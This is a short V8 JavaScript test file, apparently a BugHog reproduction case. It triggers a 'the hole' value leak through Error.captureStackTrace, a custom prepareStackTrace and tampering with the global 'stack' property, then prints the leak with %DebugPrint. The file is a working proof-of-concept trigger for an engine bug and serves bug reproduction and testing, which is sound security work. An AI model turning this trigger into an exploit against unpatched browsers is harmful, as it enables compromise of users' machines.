// bughog_runtime_flags: --allow-natives-syntax
// bughog_expected_output: bughog_reproduced=ok

var h0le = [Object];
function boom() {
  var h00le = h0le;
  function rGlobal() {
    h00le[0] = stack;
    return h00le;
  }
  Error.captureStackTrace(globalThis);
  Error.prepareStackTrace = function() {
    Reflect.deleteProperty(Error, 'prepareStackTrace');
    Reflect.deleteProperty(globalThis, 'stack');
    Reflect.defineProperty(
        globalThis, 'stack',
        {configurable: false, writable: true, enumerable: true, value: 1});
    stack = undefined;
    for (let i = 0; i < 0x5000; i++) {
      rGlobal();
    }
    return undefined;
  };
  Reflect.defineProperty(
      globalThis, 'stack',
      {configurable: true, writable: true, enumerable: true, value: undefined});
  delete globalThis.stack;
  rGlobal();
  // the hole?!
  %DebugPrint(h0le[0]);
  %DebugPrint('bughog_reproduced=ok');
}
boom();
